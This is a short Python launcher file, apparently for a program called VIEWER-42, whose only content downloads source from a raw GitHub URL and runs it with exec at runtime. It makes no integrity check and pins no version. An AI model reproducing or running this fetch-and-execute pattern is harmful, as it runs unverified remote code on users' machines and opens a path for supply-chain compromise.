from __future__ import annotations

import urllib.request

# VIEWER-42 — canonical final release
# Locked release candidate: VIEWER-42-10
BASE_URL = "https://raw.githubusercontent.com/gear66me-ui/Galaxy_Viewer/main/VIEWER-42-10.py"
with urllib.request.urlopen(BASE_URL, timeout=60) as response:
    source = response.read().decode("utf-8")
exec(compile(source, "VIEWER-42-10-base.py", "exec"))
